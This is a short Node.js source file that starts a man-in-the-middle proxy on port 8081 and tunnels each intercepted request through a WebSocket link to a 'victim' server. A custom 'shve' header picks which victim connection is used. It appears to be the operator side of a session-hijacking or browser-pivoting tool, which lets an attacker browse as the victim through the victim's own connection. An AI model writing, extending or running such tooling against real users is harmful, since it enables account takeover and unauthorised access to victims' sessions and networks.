const HttpMitmProxy = require('http-mitm-proxy');
const { startServer: startVictimServer, sendWebSocketRequest } = require('./victimServer');


function startProxyServer() {
  const proxy = new HttpMitmProxy.Proxy();

  proxy.onRequest(async (ctx, callback) => {
    const protocol = ctx.isSSL ? 'https://' : 'http://';
    const host = ctx.clientToProxyRequest.headers.host;
    const port = ctx.proxyToServerRequestOptions.port;
    const url = ctx.clientToProxyRequest.url;
  
    const fullUrl = `${protocol}${host}:${port}${url}`;
  
    console.log(`[${new Date().toISOString()}] ${ctx.clientToProxyRequest.method} ${fullUrl}`);
  
    const wsId = ctx.clientToProxyRequest.headers.shve;
    const headers = ctx.clientToProxyRequest.headers;
  
    const response = await sendWebSocketRequest(wsId, ctx.clientToProxyRequest.method, fullUrl, headers, ctx.clientToProxyRequest.postData);
  
    if (response.error) {
      ctx.proxyToClientResponse.writeHead(200, { 'Content-Type': 'text/plain' });
      ctx.proxyToClientResponse.end(response.error);
    } else {
      ctx.proxyToClientResponse.writeHead(response.status_code, response.headers);
      ctx.proxyToClientResponse.end(response.data);
    }
  
    return callback();
  });

  proxy.listen({ host: '0.0.0.0', port: 8081, sslCaDir: './certs' }, () => {
    console.log('Proxy listening on port: 8081');
  });
}

module.exports = startProxyServer;